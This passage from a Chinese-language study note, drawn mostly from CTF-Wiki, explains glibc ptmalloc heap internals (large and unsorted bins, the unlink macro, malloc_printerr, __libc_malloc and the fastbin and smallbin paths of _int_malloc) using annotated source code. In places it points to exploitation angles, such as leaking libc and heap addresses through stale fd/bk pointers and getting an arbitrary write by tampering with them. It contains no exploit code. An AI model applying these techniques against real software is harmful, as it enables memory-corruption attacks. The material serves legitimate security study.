\u7684\u4efb\u4f55\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u9274\u4e8e\u540c\u4e00\u4e2a large bin \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u56e0\u6b64\u4e3a\u4e86\u52a0\u5feb\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u7684\u901f\u5ea6\uff0c\u5c31\u5c06\u540c\u4e00\u4e2a large bin \u4e2d\u7684\u6240\u6709 chunk \u6309\u7167 chunk size \u8fdb\u884c\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5217\uff1a\u6700\u5927\u7684 chunk \u653e\u5728\u94fe\u8868\u7684\u524d\u7aef\uff0c\u6700\u5c0f\u7684 chunk \u653e\u5728\u5c3e\u7aef\u3002 large bin \u7684 free \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u7c7b\u4f3c\u4e8e small bin \u3002 large bin malloc \uff08\u90e8\u5206\uff09\u64cd\u4f5c\uff1a \u5982\u679c\u5c3e\u7aef\u6700\u5c0f\u7684 chunk \u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u7684\u8bdd\uff0c\u5c31\u5c06\u8be5 chunk \u62c6\u5206\u4e3a\u4e24\u4e2a chunk \uff1a\u524d\u8005\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5927\u5c0f\u7b49\u540c\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff1b\u5269\u4f59\u7684\u90e8\u5206\u505a\u4e3a\u4e00\u4e2a\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 Unsorted Bin \u00b6 unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684 bin \u6570\u7ec4\u4e0b\u6807 1 \u5904\u3002\u6545\u800c unsorted bin \u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0a\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002 \u4e0b\u9762\u9644\u4e0a\u5404\u7c7b\u4e0a\u8ff0\u4e09\u7c7b bin \u7684\u903b\u8f91\uff1a common macro \u00b6 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f \u6839\u636e chunk \u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97 chunk \u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz)) \u53c2\u8003\u8d44\u6599 \u00b6 Linux \u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790 CTF-WIKI Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0a\u534a\u90e8) Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0b\u534a\u90e8) Linux\u4e0b\u5806\u6808\u7ed3\u6784\u5206\u6790 \u57fa\u7840\u64cd\u4f5c \u00b6 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 unlink \u00b6 unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink 1 \uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 \u4f9d\u6b21**\u904d\u5386\u5904\u7406** unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if ( FD -> fd_nextsize == NULL ) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a nextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a 1\u3002 malloc_printerr \u00b6 \u5728 glibc malloc \u65f6\u68c0\u6d4b\u5230\u9519\u8bef\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528 malloc_printerr \u51fd\u6570\u3002 static void malloc_printerr ( const char * str ) { __libc_message ( do_abort , \"%s \\n \" , str ); __builtin_unreachable (); } \u4e3b\u8981\u4f1a\u8c03\u7528 __libc_message \u6765\u6267\u884c abort \u51fd\u6570\uff0c\u5982\u4e0b if (( action & do_abort )) { if (( action & do_backtrace )) BEFORE_ABORT ( do_abort , written , fd ); /* Kill the application. */ abort (); } \u5728 abort \u51fd\u6570\u91cc\uff0c\u5728 glibc \u8fd8\u662f 2.23 \u7248\u672c\u65f6\uff0c\u4f1a fflush stream\u3002 /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if ( stage == 1 ) { ++ stage ; fflush ( NULL ); } \u7533\u8bf7\u5185\u5b58\u5757 \u00b6 Allocate Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 __libc_malloc \u00b6 \u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709 malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002 \u8be5\u51fd\u6570\u4f1a**\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09 \uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5806\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c**\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { //size_t \u4e3a\u5f53\u524d\u7a0b\u5e8f\u4f4d\u6570\u6700\u957f\u7684\u65e0\u7b26\u53f7int\u578b mstate ar_ptr ; void * victim ; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) //\u94a9\u5b50\u4e0d\u4e3a\u7a7a return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); //\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get(ar_ptr, bytes); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc(ar_ptr, bytes); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim && ar_ptr != NULL) { LIBC_PROBE(memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry(ar_ptr, bytes); victim = _int_malloc(ar_ptr, bytes); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr->mutex); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684 arena \u4e2d assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim; } _int_malloc \u00b6 _int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684**\u5185\u5b58\u5757\u5927\u5c0f**\u4ee5\u53ca**\u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6**\uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684 chunk \u5927\u5c0f\u3002 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size(bytes, nb); arena \u00b6 /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } fast bin \u00b6 \u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { //\u7533\u8bf7\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8efastbin\u4e0a\u9650 // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index ( nb ); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr * fb = & fastbin ( av , idx ); //\u5355\u94fe\u8868 mchunkptr pp = * fb ; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if ( victim != 0 ) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk ( av , victim , nb ); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } \u5c0f\u603b\u7ed3 \u00b6 malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b fastbin \u662f\u4ece\u5934\u7ed3\u70b9\uff08\u6700\u65b0\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u540e\u51fa\u201d fast bin malloc \u68c0\u67e5\u673a\u5236 \u00b6 \u4e0d\u542f\u52a8 DEBUG \u65f6\uff0c\u53ea\u68c0\u67e5\u5373\u5c06\u5206\u914d chunk \u5bf9\u5e94\u7684 idx \u662f\u5426\u4e0e\u7533\u8bf7\u65f6\u7684 idx \u4e00\u81f4 \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a chunksize(victim) \uff1a\u63d0\u53d6 victim size fastbin_index() \uff1a\u67e5\u627e victim size \u5bf9\u5e94\u7684 idx != idx \uff1a\u68c0\u67e5\u662f\u5426\u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 malloc_printerr \u6253\u5370\u9519\u8bef\u4fe1\u606f small bin \u00b6 \u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // 